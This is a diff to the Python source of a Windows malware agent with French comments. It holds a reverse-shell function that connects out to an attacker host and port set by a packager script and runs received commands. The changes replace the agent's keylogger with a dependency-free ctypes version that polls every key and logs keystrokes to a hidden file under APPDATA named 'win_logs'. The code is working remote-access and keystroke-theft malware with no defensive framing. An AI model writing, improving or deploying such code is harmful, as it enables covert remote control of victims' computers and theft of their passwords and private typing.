@@ -4,30 +4,34 @@ import threading
 import os
 import sys
 import logging
-from pynput import keyboard
+import ctypes
+import time
 
 # 📁 Chemins des logs
 LOG_DIR = os.path.join(os.getenv("APPDATA") or "C:\\Users\\Public", "win_logs")
 KEYLOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
 os.makedirs(LOG_DIR, exist_ok=True)
 
-# 📝 Logger local (debug)
+# 📋 Logger local (debug)
 logging.basicConfig(
     filename=os.path.join(LOG_DIR, "agent_debug.log"),
     level=logging.INFO,
     format="%(asctime)s - %(message)s"
 )
 
-# 🐍 Fonction reverse shell (placeholders remplacés par packager.py)
+# 🕳️ Fonction reverse shell (placeholders dynamiques)
 def reverse_shell(host=LHOST_PLACEHOLDER, port=LPORT_PLACEHOLDER):
     try:
-        logging.info(f"Tentative de connexion à {host}:{port}")
+        logging.info(f"Tentative de connexion a {host}:{port}")
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
-        s.send(b"[+] Agent connecté depuis Windows\n")
-        logging.info("Connexion reverse shell établie")
+        s.send("[+] Agent connecte depuis Windows\n".encode())
+        logging.info("Connexion reverse shell etablie")
+
         while True:
             command = s.recv(1024).decode("utf-8")
+            if not command:
+                break
             if command.lower() in ["exit", "quit"]:
                 break
             try:
@@ -39,24 +43,25 @@ def reverse_shell(host=LHOST_PLACEHOLDER, port=LPORT_PLACEHOLDER):
     except Exception as e:
         logging.error(f"Erreur reverse_shell: {e}")
 
-# ⌨️ Fonction keylogger (local)
+# ⌨️ Fonction keylogger sans dépendance externe
 def start_keylogger():
-    def on_press(key):
-        try:
-            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
-                f.write(f"{key.char}")
-        except AttributeError:
-            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
-                f.write(f"[{key}]")
-        except Exception as e:
-            logging.error(f"Erreur lors de l'enregistrement de frappe : {e}")
+    def run():
+        logging.info("Keylogger demarre (mode autonome)")
+        while True:
+            try:
+                for key_code in range(8, 190):
+                    if ctypes.windll.user32.GetAsyncKeyState(key_code) & 0x8000:
+                        try:
+                            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
+                                f.write(chr(key_code))
+                        except:
+                            pass
+                time.sleep(0.05)
+            except Exception as e:
+                logging.error(f"Erreur keylogger: {e}")
 
-    try:
-        logging.info("Keylogger démarré")
-        listener = keyboard.Listener(on_press=on_press)
-        listener.start()
-    except Exception as e:
-        logging.error(f"Erreur keylogger: {e}")
+    t = threading.Thread(target=run, daemon=True)
+    t.start()
 
 # 🚀 Point d’entrée
 if __name__ == "__main__":
